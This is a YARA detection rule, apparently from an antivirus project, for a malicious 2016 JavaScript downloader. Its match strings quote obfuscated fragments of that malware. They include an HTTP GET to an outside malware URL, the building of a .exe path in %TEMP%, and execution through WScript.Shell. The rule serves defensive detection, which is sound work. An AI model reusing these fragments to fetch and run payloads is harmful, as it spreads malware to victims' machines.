rule sig_20160330_6a80cf25e851c615a008714f3272aa7c {
  meta:
    description = "datamaliciousorder - file 20160330_6a80cf25e851c615a008714f3272aa7c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "33667079469dfeb65c3aeee306b3ef1f2764e45bc5d6a29212fdb805dd134604"

  strings:
    $s1  = "_F[_R](\"GET\", \"http://photronlamp.com/m39ska\", false);" fullword ascii
    $s2  = "function _BO(_CY, _G){_O = _O * 1; return _CY - _G;};" fullword ascii
    $s3  = "var _XG = function _PY() {return WScript[_M0](\"WScript\"+\".Shell\");}(), _V = 11;" fullword ascii
    $s4  = "if (_F[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _NX() {return _XG[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"oPfccSrRESX.ex\" + \"e\";};" fullword ascii
    $s6  = "function _JY(_YR){_XG[\"Run\"](_YR, _O, _O);};" fullword ascii
    $s7  = "function _LP() {return ((_FY == true) && (_FY == _R0)) ? 1 : _O;};" fullword ascii
    $s8  = "function _SJ(){return 22;};" fullword ascii
    $s9  = " while (_N){" fullword ascii
    $s10 = "var _E = new this[\"Date\"]();" fullword ascii
    $s11 = "function _QT(){return _M0;};" fullword ascii
    $s12 = "function _Y(_M) {var _T = (1, 2, 3, 4, 5, _M); return _T;};" fullword ascii
    $s13 = "function _CA(){return _YH + \"\";};" fullword ascii
    $s14 = "function _XT()" fullword ascii
    $s15 = "return _BO(_N0, _SV);" fullword ascii
    $s16 = "var _R0 = false;" fullword ascii
    $s17 = "_R0 = true; " fullword ascii
    $s18 = "_FY = true; " fullword ascii
    $s19 = "var _FY = false;" fullword ascii
    $s20 = "var _E0 = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}